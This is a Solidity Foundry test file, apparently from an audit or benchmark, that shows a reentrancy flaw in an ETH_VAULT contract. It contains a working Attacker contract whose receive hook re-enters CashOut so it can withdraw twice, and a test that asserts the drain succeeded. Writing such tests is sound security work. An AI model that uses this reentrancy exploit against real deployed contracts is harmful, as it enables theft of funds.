
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is greater than MinDeposit (1 ether) and within safe bounds
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a balance in the vault first

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the vault to establish a balance
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's ETH balance before attack
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        
        // 3. Call the vulnerable CashOut function
        victim.CashOut(val);
        
        // 4. Verify Success Conditions
        // If we received more ETH than we should have (due to reentrancy), the attack succeeded
        // We deposited 'val' and should only be able to withdraw 'val' once
        // But with reentrancy, we can withdraw multiple times
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
        
        // Alternative check: if attackCallCount > 1, we successfully re-entered
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the CashOut function before state is updated
            // The balance hasn't been decremented yet, so we can withdraw again
            if (address(victim).balance >= storedAttackVal) {
                victim.CashOut(storedAttackVal);
            }
        }
    }
}
